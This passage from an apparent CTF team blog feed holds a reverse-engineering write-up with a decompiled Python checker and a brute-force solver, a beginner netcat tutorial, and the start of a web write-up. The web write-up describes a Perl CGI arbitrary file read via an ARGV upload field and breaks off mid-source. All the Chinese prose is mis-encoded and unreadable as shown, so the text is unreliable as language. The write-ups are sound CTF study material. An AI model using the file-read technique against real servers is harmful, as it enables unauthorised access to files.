loading="lazy"><p>ç½®æ¢ä¹‹åï¼š</p><img src="/article/2020hxb-Writeup-cOMING/0b91b5d7322cfcb630981982098feea8.png" class="" loading="lazy"><p>æ”¹åç¼€ï¼šReMe.pyc</p><pre class="language-none"><code class="language-none">uncompyle6 ReMe.pycÎ» uncompyle6 ReMe.pyc# uncompyle6 version 3.7.4# Python bytecode 3.7 (3394)# Decompiled from: Python 3.8.5 (tags&#x2F;v3.8.5:580fbb0, Jul 20 2020, 15:57:54) [MSC v.1924 64 bit (AMD64)]# Embedded file name: ReMe.py# Compiled at: 1995-09-28 00:18:56# Size of source mod 2**32: 272 bytesimport sys, hashlibcheck &#x3D; [ &#39;e5438e78ec1de10a2693f9cffb930d23&#39;, &#39;08e8e8855af8ea652df54845d21b9d67&#39;, &#39;a905095f0d801abd5865d649a646b397&#39;, &#39;bac8510b0902185146c838cdf8ead8e0&#39;, &#39;f26f009a6dc171e0ca7a4a770fecd326&#39;, &#39;cffd0b9d37e7187483dc8dd19f4a8fa8&#39;, &#39;4cb467175ab6763a9867b9ed694a2780&#39;, &#39;8e50684ac9ef90dfdc6b2e75f2e23741&#39;, &#39;cffd0b9d37e7187483dc8dd19f4a8fa8&#39;, &#39;fd311e9877c3db59027597352999e91f&#39;, &#39;49733de19d912d4ad559736b1ae418a7&#39;, &#39;7fb523b42413495cc4e610456d1f1c84&#39;, &#39;8e50684ac9ef90dfdc6b2e75f2e23741&#39;, &#39;acb465dc618e6754de2193bf0410aafe&#39;, &#39;bc52c927138231e29e0b05419e741902&#39;, &#39;515b7eceeb8f22b53575afec4123e878&#39;, &#39;451660d67c64da6de6fadc66079e1d8a&#39;, &#39;8e50684ac9ef90dfdc6b2e75f2e23741&#39;, &#39;fe86104ce1853cb140b7ec0412d93837&#39;, &#39;acb465dc618e6754de2193bf0410aafe&#39;, &#39;c2bab7ea31577b955e2c2cac680fb2f4&#39;, &#39;8e50684ac9ef90dfdc6b2e75f2e23741&#39;, &#39;f077b3a47c09b44d7077877a5aff3699&#39;, &#39;620741f57e7fafe43216d6aa51666f1d&#39;, &#39;9e3b206e50925792c3234036de6a25ab&#39;, &#39;49733de19d912d4ad559736b1ae418a7&#39;, &#39;874992ac91866ce1430687aa9f7121fc&#39;]def func(num):    result &#x3D; []    while num !&#x3D; 1:        num &#x3D; num * 3 + 1 if num % 2 else num &#x2F;&#x2F; 2        result.append(num)    return resultif __name__ &#x3D;&#x3D; &#39;__main__&#39;:    print(&#39;Your input is not the FLAG!&#39;)    inp &#x3D; input()    if len(inp) !&#x3D; 27:        print(&#39;length error!&#39;)        sys.exit(-1)    for i, ch in enumerate(inp):        ret_list &#x3D; func(ord(ch))        s &#x3D; &#39;&#39;        for idx in range(len(ret_list)):            s +&#x3D; str(ret_list[idx])            s +&#x3D; str(ret_list[(len(ret_list) - idx - 1)])        md5 &#x3D; hashlib.md5()        md5.update(s.encode(&#39;utf-8&#39;))        if md5.hexdigest() !&#x3D; check[i]:            sys.exit(i)    md5 &#x3D; hashlib.md5()    md5.update(inp.encode(&#39;utf-8&#39;))    print(&#39;You win!&#39;)    print(&#39;flag&#123;&#39; + md5.hexdigest() + &#39;&#125;&#39;)# okay decompiling ReMe.pyc</code></pre><p>exp:</p><pre class="language-none"><code class="language-none">import hashlibcheck &#x3D; [ &#39;e5438e78ec1de10a2693f9cffb930d23&#39;, &#39;08e8e8855af8ea652df54845d21b9d67&#39;, &#39;a905095f0d801abd5865d649a646b397&#39;, &#39;bac8510b0902185146c838cdf8ead8e0&#39;, &#39;f26f009a6dc171e0ca7a4a770fecd326&#39;, &#39;cffd0b9d37e7187483dc8dd19f4a8fa8&#39;, &#39;4cb467175ab6763a9867b9ed694a2780&#39;, &#39;8e50684ac9ef90dfdc6b2e75f2e23741&#39;, &#39;cffd0b9d37e7187483dc8dd19f4a8fa8&#39;, &#39;fd311e9877c3db59027597352999e91f&#39;, &#39;49733de19d912d4ad559736b1ae418a7&#39;, &#39;7fb523b42413495cc4e610456d1f1c84&#39;, &#39;8e50684ac9ef90dfdc6b2e75f2e23741&#39;, &#39;acb465dc618e6754de2193bf0410aafe&#39;, &#39;bc52c927138231e29e0b05419e741902&#39;, &#39;515b7eceeb8f22b53575afec4123e878&#39;, &#39;451660d67c64da6de6fadc66079e1d8a&#39;, &#39;8e50684ac9ef90dfdc6b2e75f2e23741&#39;, &#39;fe86104ce1853cb140b7ec0412d93837&#39;, &#39;acb465dc618e6754de2193bf0410aafe&#39;, &#39;c2bab7ea31577b955e2c2cac680fb2f4&#39;, &#39;8e50684ac9ef90dfdc6b2e75f2e23741&#39;, &#39;f077b3a47c09b44d7077877a5aff3699&#39;, &#39;620741f57e7fafe43216d6aa51666f1d&#39;, &#39;9e3b206e50925792c3234036de6a25ab&#39;, &#39;49733de19d912d4ad559736b1ae418a7&#39;, &#39;874992ac91866ce1430687aa9f7121fc&#39;]def func(number):    ret &#x3D; []    while number !&#x3D; 1:        number &#x3D; number * 3 + 1 if number % 2 else number &#x2F;&#x2F; 2        ret.append(number)    return retfor i in range(1,128):    a &#x3D; func(i)    ans &#x3D; &quot;&quot;    for j in range(len(a)):        ans +&#x3D; str(a[j])        ans +&#x3D; str(a[(len(a) - j - 1)])    md5 &#x3D; hashlib.md5()    md5.update(ans.encode(&#39;utf-8&#39;))    b &#x3D; md5.hexdigest()    for j in range(27):        if b &#x3D;&#x3D; check[j]:            print chr(i),j</code></pre><p>è·‘å‡º flag{My_M@th_3X+1_R3v_Te5t} å†è·‘md5</p><img src="/article/2020hxb-Writeup-cOMING/ac2500682b8e1112e9a89ce1b1f97465.png" class="" loading="lazy">]]></content>
      
      
      <categories>
          
          <category> Write-Up </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PHP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Netcat ç½‘ç»œæµ‹è¯•å·¥å…·</title>
      <link href="article/Netcat/"/>
      <url>article/Netcat/</url>
      
        <content type="html"><![CDATA[<h2 id="è¿™é‡Œæ˜¯ä¸­å›½ç§‘æŠ€å¤§å­¦-taoky-å†™çš„ä¸€ç¯‡æ–‡ç« -ncæ˜¯ä»€ä¹ˆ"><a href="#è¿™é‡Œæ˜¯ä¸­å›½ç§‘æŠ€å¤§å­¦-taoky-å†™çš„ä¸€ç¯‡æ–‡ç« -ncæ˜¯ä»€ä¹ˆ" class="headerlink" title="è¿™é‡Œæ˜¯ä¸­å›½ç§‘æŠ€å¤§å­¦@taoky å†™çš„ä¸€ç¯‡æ–‡ç« : ncæ˜¯ä»€ä¹ˆ?"></a><strong>è¿™é‡Œæ˜¯ä¸­å›½ç§‘æŠ€å¤§å­¦@taoky å†™çš„ä¸€ç¯‡æ–‡ç« : ncæ˜¯ä»€ä¹ˆ?</strong></h2><p>è¯·ä»”ç»†é˜…è¯»ï¼Œä¸€èˆ¬äºŒè¿›åˆ¶binæ–¹å‘å¯èƒ½ç”¨åˆ°ncçš„åœ°æ–¹ä¼šå¾ˆå¤šã€‚</p><hr><p>nc/ncat æ˜¯ netcat çš„ç¼©å†™ï¼Œå®ƒå¯ä»¥è¯»å†™ TCP ä¸ UDP ç«¯å£â€”â€”æˆ–è®¸ä½ çœ‹ä¸æ‡‚è¿™å¥è¯ï¼Œè¿™æ²¡æœ‰å…³ç³»ã€‚ç®€å•åœ°è¯´ï¼Œå®ƒå¯ä»¥åœ¨å­—ç¬¦ç•Œé¢ä¸‹ï¼Œè®©ä½ å’ŒæœåŠ¡å™¨æ²Ÿé€šäº¤æµã€‚<br>ä¸€èˆ¬æ¥è¯´ï¼Œæœ‰å¾ˆå¤šé¢˜ç›®éƒ½ä¼šè¦æ±‚ä½ ä½¿ç”¨ nc è¿æ¥åˆ°ä»–ä»¬çš„æœåŠ¡å™¨ï¼Œå¹¶ä¸”è¿›è¡Œäº¤äº’ï¼Œè·å¾— flag</p><h2 id="å¦‚ä½•å®‰è£…-ncï¼Ÿ"><a href="#å¦‚ä½•å®‰è£…-ncï¼Ÿ" class="headerlink" title="å¦‚ä½•å®‰è£… ncï¼Ÿ"></a>å¦‚ä½•å®‰è£… ncï¼Ÿ</h2><p><code>nc</code> å‘½ä»¤åœ¨ macOS ä¸­æ˜¯è‡ªå¸¦çš„ï¼Œåœ¨ Linux ä¸­ä¸€èˆ¬è‡ªå¸¦ï¼Œæˆ–æ˜¯å¯ä»¥ä½¿ç”¨ç›¸åº”çš„è½¯ä»¶åŒ…ç®¡ç†å™¨å®‰è£…ï¼ˆå¦‚åœ¨ Debian/Ubuntu ä¸­è¿™ä¸ªåŒ…åå« netcatï¼‰ã€‚</p><p>å½“ç„¶ï¼Œå¦‚æœä½ åœ¨çœ‹è¿™ç¯‡æ‰‹å†Œï¼Œä½ çš„æ“ä½œç³»ç»Ÿå¾ˆæœ‰å¯èƒ½æ˜¯ Windowsã€‚å®ƒä¸è‡ªå¸¦ <code>nc</code>ï¼Œå°½ç®¡å¯ä»¥ç”¨ WSL æˆ–è€…è™šæ‹Ÿæœºçš„æ–¹å¼è§£å†³ï¼Œä½†æ˜¯å¦‚æœä½ è§‰å¾—è¿™æ ·å¤ªéº»çƒ¦äº†ï¼Œä¹Ÿæœ‰å¦å¤–ä¸€äº›æ–¹æ³•ã€‚</p><h3 id="ä½¿ç”¨é™æ€é“¾æ¥çš„-ncat-ç¨‹åº"><a href="#ä½¿ç”¨é™æ€é“¾æ¥çš„-ncat-ç¨‹åº" class="headerlink" title="ä½¿ç”¨é™æ€é“¾æ¥çš„ ncat ç¨‹åº"></a>ä½¿ç”¨é™æ€é“¾æ¥çš„ ncat ç¨‹åº</h3><p>å‰å¾€ <a href="https://github.com/andrew-d/static-binaries/blob/master/binaries/windows/x86/ncat.exe">æ­¤å¤„</a> (githubé“¾æ¥)ä¸‹è½½æ­¤ç¨‹åºã€‚æˆ‘ä»¬ä¹Ÿåœ¨è¿™é‡Œæä¾›äº†ä¸€ä»½ã€‚ä¸‹è½½ä¸‹æ¥å³å¯ã€‚</p><p><a href="/download/ncat.zip">ncat.zip</a></p><blockquote><p>æ³¨ï¼šnc/ncat äº‹å®ä¸Šæ˜¯ä¸¤ä¸ªä¸åŒçš„ç¨‹åºï¼Œä½†åœ¨æˆ‘ä»¬æ¥ä¸‹æ¥çš„ä½¿ç”¨ä¸Šï¼ŒåŸºæœ¬æ²¡æœ‰åŒºåˆ«ã€‚ncat æ˜¯ç”± Nmap é¡¹ç›®å¼€å‘çš„â€œé‡ç½®ç‰ˆçš„ Netcatâ€ã€‚</p></blockquote><h4 id="Q-æˆ‘çš„æ€æ¯’è½¯ä»¶æŠ¥æ¯’æ€ä¹ˆåŠ"><a href="#Q-æˆ‘çš„æ€æ¯’è½¯ä»¶æŠ¥æ¯’æ€ä¹ˆåŠ" class="headerlink" title="Q:æˆ‘çš„æ€æ¯’è½¯ä»¶æŠ¥æ¯’æ€ä¹ˆåŠ"></a>Q:æˆ‘çš„æ€æ¯’è½¯ä»¶æŠ¥æ¯’æ€ä¹ˆåŠ</h4><p>å¦‚æœä½ ä¸ç›¸ä¿¡æ­¤æ¥æºï¼Œä¹Ÿå¯ä»¥ä¸‹è½½ nmapï¼ˆä¸€ä¸ªç½‘ç»œæ¢æµ‹ã€æ‰«æå·¥å…·ï¼‰ï¼Œå®ƒä¼šé™„å¸¦ä¸€ä¸ª ncatã€‚</p><h2 id="å¦‚ä½•ä½¿ç”¨-nc"><a href="#å¦‚ä½•ä½¿ç”¨-nc" class="headerlink" title="å¦‚ä½•ä½¿ç”¨ nc?"></a>å¦‚ä½•ä½¿ç”¨ nc?</h2><h3 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h3><p>ç›´æ¥åŒå‡»ï¼Œä½ ä¼šçœ‹åˆ°ä¸€ä¸ªçª—å£ä¸€æ‰«è€Œè¿‡â€”â€”è¿™æ˜¯æ­£å¸¸ç°è±¡ã€‚ä½ éœ€è¦ä½¿ç”¨ã€Œå‘½ä»¤æç¤ºç¬¦ã€æˆ–è€…ã€ŒPowerShellã€æ¥è®¿é—®è¿™ä¸ªç¨‹åºã€‚</p><p>Windows 10 ä¸­ï¼Œä½ å¯ä»¥ä½¿ç”¨èµ„æºç®¡ç†å™¨ -&gt; æ–‡ä»¶æ¥åœ¨ä½ å­˜æ”¾ nc çš„ç›®å½•ä¸­æ‰“å¼€å‘½ä»¤æç¤ºç¬¦æˆ– PowerShellã€‚</p><img src="/article/Netcat/explorer-1024x510.png" class="" loading="lazy"><h6 id="åœ¨-Windows-èµ„æºç®¡ç†å™¨ä¸­æ‰“å¼€å‘½ä»¤æç¤ºç¬¦æˆ–-PowerShell"><a href="#åœ¨-Windows-èµ„æºç®¡ç†å™¨ä¸­æ‰“å¼€å‘½ä»¤æç¤ºç¬¦æˆ–-PowerShell" class="headerlink" title="åœ¨ Windows èµ„æºç®¡ç†å™¨ä¸­æ‰“å¼€å‘½ä»¤æç¤ºç¬¦æˆ– PowerShell"></a>åœ¨ Windows èµ„æºç®¡ç†å™¨ä¸­æ‰“å¼€å‘½ä»¤æç¤ºç¬¦æˆ– PowerShell</h6><p>å¯ä»¥ç›´æ¥åœ¨<code>ncat.exe</code>æ‰€åœ¨ç›®å½•ï¼ŒæŒ‰ä½<code>Shift+é¼ æ ‡å³é”®</code>ç‚¹å‡»<code>åœ¨æ­¤å¤„æ‰“å¼€Powershellçª—å£</code>è¾“å…¥<code>ncat</code></p><p>æˆ–è€…ï¼Œä½ ä¹Ÿå¯ä»¥åœ¨å¼€å§‹èœå• -&gt; Windows ç³»ç»Ÿä¸­æ‰“å¼€å‘½ä»¤æç¤ºç¬¦ï¼Œæˆ–è€…åœ¨å¼€å§‹èœå• -&gt; Windows PowerShell ä¸­æ‰“å¼€ PowerShellï¼Œä¹Ÿå¯ä»¥æŒ‰ä½<code>winæ ‡+R</code>å¼¹å‡º<code>è¿è¡Œ</code>çª—å£è¾“å…¥<code>cmd</code>ï¼Œç„¶åä½¿ç”¨ cd å‘½ä»¤è½¬ç§»åˆ°å¯¹åº”çš„ç›®å½•ï¼šè¾“å…¥ cd æ–‡ä»¶å¤¹å å¯ä»¥è®©ä½ è½¬ç§»åˆ°å¯¹åº”çš„æ–‡ä»¶å¤¹ï¼Œè¾“å…¥ cd .. å¯ä»¥è®©ä½ è½¬ç§»åˆ°ä¸Šé¢ä¸€å±‚ç›®å½•ã€‚ä½¿ç”¨ dir å‘½ä»¤ï¼Œå¯ä»¥æ˜¾ç¤ºå½“å‰ç›®å½•ä¸‹æ‰€æœ‰æ–‡ä»¶ã€‚åŒæ—¶ï¼Œä½¿ç”¨ Tab é”®å¯ä»¥å¸®åŠ©ä½ è¡¥å…¨åç§°ã€‚</p><p>å½“è·³è½¬åˆ°ä½ å­˜æ”¾ nc çš„æ–‡ä»¶å¤¹åï¼š</p><ul><li>å¦‚æœä½ ä½¿ç”¨çš„æ˜¯ PowerShellï¼ˆè“è‰²èƒŒæ™¯ï¼‰ï¼Œè¾“å…¥ ./ncatï¼ˆæ ¹æ® nc å¯¹åº”çš„åç§°ä¸åŒè€Œä¸åŒï¼‰ã€‚</li><li>å¦‚æœä½ ä½¿ç”¨çš„æ˜¯å‘½ä»¤æç¤ºç¬¦ï¼ˆé»‘è‰²èƒŒæ™¯ï¼‰ï¼Œè¾“å…¥ ncatï¼ˆæ ¹æ® nc å¯¹åº”çš„åç§°ä¸åŒè€Œä¸åŒï¼‰ã€‚</li></ul><p>å½“æ˜¾ç¤ºä»¥ä¸‹å†…å®¹æ—¶ï¼Œè¯´æ˜ä½ æˆåŠŸè¿è¡Œäº†å®ƒã€‚</p><img src="/article/Netcat/image-20210220172523253.png" class="" title="nc" loading="lazy"><h6 id="æˆåŠŸè¿è¡Œ-ncat"><a href="#æˆåŠŸè¿è¡Œ-ncat" class="headerlink" title="æˆåŠŸè¿è¡Œ ncat"></a>æˆåŠŸè¿è¡Œ ncat</h6><h3 id="Linux-amp-macOS"><a href="#Linux-amp-macOS" class="headerlink" title="Linux &amp; macOS"></a>Linux &amp; macOS</h3><p>æ‰“å¼€ã€Œç»ˆç«¯ã€ï¼Œè¾“å…¥ <code>nc</code>ã€‚</p><pre class="language-none"><code class="language-none">$ ncusage: nc [-46AacCDdEFhklMnOortUuvz] [-K tc] [-b boundif] [-i interval] [-p source_port] [--apple-delegate-pid pid] [--apple-delegate-uuid uuid]  [-s source_ip_address] [-w timeout] [-X proxy_version]  [-x proxy_address[:port]] [hostname] [port[s]]</code></pre><p>å‡ºç°äº†ç±»ä¼¼ä¸Šé¢çš„è¾“å‡ºï¼Œè¯´æ˜è¿è¡ŒæˆåŠŸäº†ã€‚</p><img src="/article/Netcat/image-20210220170815879.png" class="" title="image-20210220170815879" loading="lazy"><h3 id="ç¤ºä¾‹"><a href="#ç¤ºä¾‹" class="headerlink" title="ç¤ºä¾‹"></a>ç¤ºä¾‹</h3><p>åœ¨æˆ‘ä»¬ä½¿ç”¨æµè§ˆå™¨ä¸Šç½‘çš„æ—¶å€™ï¼Œæˆ‘ä»¬å’ŒæœåŠ¡å™¨ä½¿ç”¨äº† HTTP åè®®è¿›è¡Œè¿æ¥ã€‚å…³äº HTTP åè®®çš„æ›´å¤šç»†èŠ‚ï¼Œä½ éœ€è¦è‡ªå·±ä¸Šç½‘æœç´¢ã€‚ä¸€èˆ¬æ¥è¯´ï¼Œé»˜è®¤æ˜¯ 80 ç«¯å£ã€‚</p><p>æˆ‘ä»¬å¯ä»¥ä½¿ç”¨ ncï¼Œå°è¯•ä¸€æ¬¡ä¸ç½‘é¡µæœåŠ¡å™¨çš„è¿æ¥ï¼Œä»¥ç™¾åº¦ä¸ºä¾‹ã€‚</p><p>è¾“å…¥ <code>nc www.baidu.com 80</code>ï¼ˆæˆ–è€… <code>ncat www.baidu.com 80</code>ï¼Œæˆ–è€… <code>./ncat www.baidu.com 80</code>ï¼Œè¯·æ ¹æ®ä»¥ä¸Šçš„ä»‹ç»è‡ªè¡Œä¿®æ”¹ï¼‰ï¼Œç¨‹åºä¼šç­‰å¾…ä½ çš„è¾“å…¥ã€‚</p><p>è¾“å…¥ GET / HTTP/1.0ã€‚è¿™è¡¨ç¤ºï¼Œæˆ‘ä»¬ä½¿ç”¨ HTTP/1.0 è¿™ä¸ªåè®®ç‰ˆæœ¬ï¼Œç”¨ GET çš„æ–¹å¼è¯·æ±‚æ ¹ /ã€‚è¾“å…¥<strong>ä¸¤ä¸‹</strong>å›è½¦ï¼Œä»£è¡¨æˆ‘ä»¬çš„ HTTP è¯·æ±‚å®Œæˆã€‚å¦‚æœä½ çš„ç½‘ç»œç•…é€šï¼Œç™¾åº¦çš„ç½‘é¡µæœåŠ¡å™¨ä¼šç«‹åˆ»è¿”å›å¤§é‡ä¿¡æ¯ï¼Œå¯ä»¥è‡ªè¡Œæœç´¢ï¼Œäº†è§£å®ƒä»¬çš„å«ä¹‰ã€‚ç°åœ¨ï¼Œä½ æˆåŠŸï¼ˆåœ¨ä¸ä½¿ç”¨æµè§ˆå™¨çš„æƒ…å†µä¸‹ï¼‰å®Œæˆäº†ä¸€æ¬¡ä¸ç™¾åº¦ç½‘ç«™çš„è¿æ¥ï¼</p><img src="/article/Netcat/image-20210220172713535.png" class="" title="nc success" loading="lazy"><h6 id="å†…å®¹å¯èƒ½ä¸åŒï¼Œè¿”å›ç±»ä¼¼å³è¡¨ç¤ºæˆåŠŸ"><a href="#å†…å®¹å¯èƒ½ä¸åŒï¼Œè¿”å›ç±»ä¼¼å³è¡¨ç¤ºæˆåŠŸ" class="headerlink" title="å†…å®¹å¯èƒ½ä¸åŒï¼Œè¿”å›ç±»ä¼¼å³è¡¨ç¤ºæˆåŠŸ"></a>å†…å®¹å¯èƒ½ä¸åŒï¼Œè¿”å›ç±»ä¼¼å³è¡¨ç¤ºæˆåŠŸ</h6><p>å¦‚æœä½ æˆåŠŸäº†ï¼Œé‚£ä¹ˆä½ å¯ä»¥å¼€å§‹æ„‰å¿«åœ°å®Œæˆæˆ‘ä»¬çš„é¢˜ç›®äº†ï¼</p><hr><p>end</p>]]></content>
      
      
      <categories>
          
          <category> æ‚è°ˆç¬”è®° </category>
          
          <category> èœé¸¡æ•™ç¨‹ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Netcat </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Buuoj WEB Write-up</title>
      <link href="article/Buuoj-WEB-Write-up/"/>
      <url>article/Buuoj-WEB-Write-up/</url>
      
        <content type="html"><![CDATA[<p>by:gyy</p><p>åˆ·é¢˜ï¼Œbuuojè®°å½•</p><a id="more"></a><hr><h2 id="CSAWQual-2016-i-got-id"><a href="#CSAWQual-2016-i-got-id" class="headerlink" title="[CSAWQual 2016]i_got_id"></a>[CSAWQual 2016]i_got_id</h2><img src="/article/Buuoj-WEB-Write-up/image-20201129165730787.png" class="" title="image-20201129165730787" loading="lazy"><p>å’±ä¹Ÿä¸æ‡‚perlâ€¦</p><p>å‘ç°äº†æ–‡ä»¶ä¸Šä¼ çš„åœ°æ–¹</p><img src="/article/Buuoj-WEB-Write-up/image-20201129165825648.png" class="" title="image-20201129165825648" loading="lazy"><p>å‘ç°ä¼šæŠŠä¸Šä¼ çš„æ–‡ä»¶ç›´æ¥æ˜¾ç¤ºåœ¨ç½‘é¡µä¸Š</p><p>æŸ¥äº†ä¸‹åŸç†</p><h5 id="perlparam-ä»»æ„æ–‡ä»¶è¯»å–"><a href="#perlparam-ä»»æ„æ–‡ä»¶è¯»å–" class="headerlink" title="perlparam()ä»»æ„æ–‡ä»¶è¯»å–"></a>perlparam()ä»»æ„æ–‡ä»¶è¯»å–</h5><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$cgi</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">upload</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'file'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    my <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token variable">$cgi</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">param</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'file'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token operator">&lt;</span><span class="token variable">$file</span><span class="token operator">></span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">print</span> <span class="token double-quoted-string string">"<span class="token interpolation"><span class="token variable">$_</span></span>"</span><span class="token punctuation">;</span>        <span class="token keyword">print</span> <span class="token double-quoted-string string">"&lt;br />"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><p> å¦‚ä¸Šä»£ç å°†ä¸Šä¼ çš„æ–‡ä»¶åŸæ ·è¾“å‡ºåˆ°ç½‘é¡µ </p><p>çŸ¥è¯†ç‚¹ï¼š param()å‡½æ•°ä¼šè¿”å›ä¸€ä¸ªåˆ—è¡¨çš„æ–‡ä»¶ä½†æ˜¯åªæœ‰ç¬¬ä¸€ä¸ªæ–‡ä»¶ä¼šè¢«æ”¾å…¥åˆ°ä¸‹é¢çš„fileå˜é‡ä¸­ã€‚è€Œå¯¹äºä¸‹é¢çš„è¯»æ–‡ä»¶é€»è¾‘æ¥è¯´ï¼Œå¦‚æœæˆ‘ä»¬ä¼ å…¥ä¸€ä¸ªARGVçš„æ–‡ä»¶ï¼Œé‚£ä¹ˆPerlä¼šå°†ä¼ å…¥çš„å‚æ•°ä½œä¸ºæ–‡ä»¶åè¯»å‡ºæ¥ã€‚è¿™æ ·ï¼Œæˆ‘ä»¬çš„åˆ©ç”¨æ–¹æ³•å°±å‡ºç°äº†ï¼šåœ¨æ­£å¸¸çš„ä¸Šä¼ æ–‡ä»¶å‰é¢åŠ ä¸Šä¸€ä¸ªæ–‡ä»¶ä¸Šä¼ é¡¹ARGVï¼Œç„¶ååœ¨URLä¸­ä¼ å…¥æ–‡ä»¶è·¯å¾„å‚æ•°ï¼Œè¿™æ ·å°±å¯ä»¥è¯»å–ä»»æ„æ–‡ä»¶äº†ã€‚ </p><p>ARGVâ€”â€”å‘½ä»¤è¡Œå‚æ•°</p><p>äºæ˜¯æŠ“åŒ…</p><img src="/article/Buuoj-WEB-Write-up/image-20201129170225902.png" class="" title="image-20201129170225902" loading="lazy"><p>ä¿®æ”¹ä¸ºï¼š</p><img src="/article/Buuoj-WEB-Write-up/image-20201129170548925.png" class="" title="image-20201129170548925" loading="lazy"><hr><h2 id="DDCTF-2019-homebrew-event-loop"><a href="#DDCTF-2019-homebrew-event-loop" class="headerlink" title="[DDCTF 2019]homebrew event loop"></a>[DDCTF 2019]homebrew event loop</h2><img src="/article/Buuoj-WEB-Write-up/image-20201129170732360.png" class="" title="image-20201129170732360" loading="lazy"><p>source code</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span> session<span class="token punctuation">,</span> request<span class="token punctuation">,</span> Response<span class="token keyword">import</span> urllibapp <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>app<span class="token punctuation">.</span>secret_key <span class="token operator">=</span> <span class="token string">'*********************'</span>  <span class="token comment"># censored</span>url_prefix <span class="token operator">=</span> <span class="token string">'/d5afe1f66147e857'</span><span class="token keyword">def</span> <span class="token function">FLAG</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> <span class="token string">'*********************'</span>  <span class="token comment"># censored</span><span class="token keyword">def</span> <span class="token function">trigger_event</span><span class="token punctuation">(</span>event<span class="token punctuation">)</span><span class="token punctuation">:</span>    session<span class="token punctuation">[</span><span class="token string">'log'</span><span class="token punctuation">]</span><span class="token punctuation">.</span>append<span class="token punctuation">(</span>event<span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>session<span class="token punctuation">[</span><span class="token string">'log'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">5</span><span class="token punctuation">:</span>        session<span class="token punctuation">[</span><span class="token string">'log'</span><span class="token punctuation">]</span> <span class="token operator">=</span> session<span class="token punctuation">[</span><span class="token string">'log'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">5</span><span class="token punctuation">:</span><span class="token punctuation">]</span>    <span class="token keyword">if</span> <span class="token builtin">type</span><span class="token punctuation">(</span>event<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token builtin">type</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        request<span class="token punctuation">.</span>event_queue <span class="token operator">+=</span> event    <span class="token keyword">else</span><span class="token punctuation">:</span>        request<span class="token punctuation">.</span>event_queue<span class="token punctuation">.</span>append<span class="token punctuation">(</span>event<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">get_mid_str</span><span class="token punctuation">(</span>haystack<span class="token punctuation">,</span> prefix<span class="token punctuation">,</span> postfix<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    haystack <span class="token operator">=</span> haystack<span class="token punctuation">[</span>haystack<span class="token punctuation">.</span>find<span class="token punctuation">(</span>prefix<span class="token punctuation">)</span><span class="token operator">+</span><span class="token builtin">len</span><span class="token punctuation">(</span>prefix<span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token punctuation">]</span>    <span class="token keyword">if</span> postfix <span class="token keyword">is</span> <span class="token keyword">not</span> <span class="token boolean">None</span><span class="token punctuation">:</span>        haystack <span class="token operator">=</span> haystack<span class="token punctuation">[</span><span class="token punctuation">:</span>haystack<span class="token punctuation">.</span>find<span class="token punctuation">(</span>postfix<span class="token punctuation">)</span><span class="token punctuation">]</span>    <span class="token keyword">return</span> haystack<span class="token keyword">class</span> <span class="token class-name">RollBackException</span><span class="token punctuation">:</span>    <span class="token keyword">pass</span><span class="token keyword">def</span> <span class="token function">execute_event_loop</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    valid_event_chars <span class="token operator">=</span> <span class="token builtin">set</span><span class="token punctuation">(</span>        <span class="token string">'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_0123456789:;#'</span><span class="token punctuation">)</span>    resp <span class="token operator">=</span> <span class="token boolean">None</span>    <span class="token keyword">while</span> <span class="token builtin">len</span><span class="token punctuation">(</span>request<span class="token punctuation">.</span>event_queue<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">:</span>        <span class="token comment"># `event` is something like "action:ACTION;ARGS0#ARGS1#ARGS2......"</span>        event <span class="token operator">=</span> request<span class="token punctuation">.</span>event_queue<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>        request<span class="token punctuation">.</span>event_queue <span class="token operator">=</span> request<span class="token punctuation">.</span>event_queue<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">]</span>        <span class="token keyword">if</span> <span class="token keyword">not</span> event<span class="token punctuation">.</span>startswith<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token string">'action:'</span><span class="token punctuation">,</span> <span class="token string">'func:'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">continue</span>        <span class="token keyword">for</span> c <span class="token keyword">in</span> event<span class="token punctuation">:</span>            <span class="token keyword">if</span> c <span class="token keyword">not</span> <span class="token keyword">in</span> valid_event_chars<span class="token punctuation">:</span>                <span class="token 